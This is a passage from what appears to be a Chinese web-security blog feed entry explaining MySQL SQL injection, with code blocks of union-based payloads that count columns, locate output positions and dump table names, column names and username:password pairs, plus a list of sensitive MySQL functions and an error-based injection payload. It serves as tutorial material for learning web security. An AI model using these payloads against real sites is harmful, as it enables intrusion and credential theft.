class="line">11</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span> order by <span class="number">6</span> <span class="comment">//判断字段数 </span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="comment">//找出回显位 </span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,user(),database(),<span class="number">5</span>,<span class="number">6</span> <span class="comment">//简单获取一些系统信息</span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> from information_schema.tables where table.schema=<span class="number">16</span>进制的当前数据库 <span class="comment">//获取表名</span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> from information_schema.columns where table_name=<span class="number">16</span>进制的表名 <span class="comment">//获取字段名 </span></span><br><span class="line"></span><br><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(username,<span class="number">0x3a</span>,password),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> from 表名 <span class="comment">//获取字段内容</span></span><br></pre></td></tr></table></figure><p>附常用敏感函数：</p><p><code>user()</code>,<code>database()</code>,<code>@@basedir</code>,<code>@@tmpdir</code>,<code>version()</code>,<code>@@datadir</code>,</p><p><code>@@general_log_file</code>,<code>@@hostname</code>,<code>@@plugin_dir</code>,<code>@@port</code>,<code>@@global.version_compile_os</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table.schema=<span class="number">0</span>xxxx  //获取表</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0</span>xxxxx  //获取字段</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(username,<span class="number">0x3a</span>,<span class="keyword">password</span>) <span class="keyword">from</span> 表名</span><br></pre></td></tr></table></figure><p><strong>报错注入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`select * from ad where id=1` `and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);`</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Snipaste_2017-11-28_15-41-50.png" alt="enter description here" title="sql查询错误"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/1513155397482.jpg&quot; alt=&quot;...&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="阅读" scheme="http://airs-sec.com/categories/%E9%98%85%E8%AF%BB/"/>
    
    
      <category term="web安全" scheme="http://airs-sec.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
